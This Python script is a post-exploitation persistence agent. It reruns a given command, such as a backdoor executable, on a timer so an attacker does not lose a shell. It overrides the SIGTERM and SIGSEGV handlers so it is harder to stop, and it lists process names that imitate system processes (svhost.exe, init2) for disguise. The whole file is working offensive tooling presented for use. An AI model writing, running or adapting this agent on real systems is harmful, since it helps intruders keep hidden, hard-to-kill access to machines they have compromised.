#!/usr/bin/env python
import os
import signal
from argparse import ArgumentParser
from time import sleep

LINUX_DISGUISE_PROCESS_NAMES = ['init2', 'login', '/usr/lib/gvfs/dvfsd', '/usr/lib/ibus/ibus-dconf']
WINDOWS_DISGUISE_PROCESS_NAMES = ['winmanager.exe', 'svhost.exe', 'wmi.exe', 'logon.exe']


def get_arguments():
    parser = ArgumentParser(
                description="Use this script to create a tiny agent that will periodically rerun your --cmd command, "
                            "so you won't lose your shell anymore.")
    parser.add_argument('--sleep',
                        dest='sleep',
                        default=30,
                        required=False,
                        help='Sleep timer in seconds. This timer specifies how often the given --cmd command runs. '
                             '60 == 1min, 3600 == 1hour')
    parser.add_argument('--cmd',
                        dest='cmd',
                        required=True,
                        help='Command to use, in the following format: '
                             '"C:\\WINDOWS\\system32\\backdoor.exe"')
    options = parser.parse_args()
    return options


def handle_signal(signal_number, frame):
    print('Dodging SIGTERM signal from the kernel')
    return


def execute_command(cmd):
    try:
        os.system(cmd)
    except Exception as e:
        print(e)


def work_forever(cmd, sleep_timer_in_seconds):
    while True:
        print('Running ' + cmd)
        execute_command(cmd)
        print('Sleeping for ' + str(sleep_timer_in_seconds) + ' seconds')
        sleep(sleep_timer_in_seconds)


# 1 - OVERRIDE THE KERNEL SIGNAL HANDLERS
signal.signal(signal.SIGTERM, handle_signal)
signal.signal(signal.SIGSEGV, handle_signal)

# 2 - START THE AGENT
options = get_arguments()
cmd = options.cmd
sleep_timer = int(options.sleep)
work_forever(cmd, sleep_timer)
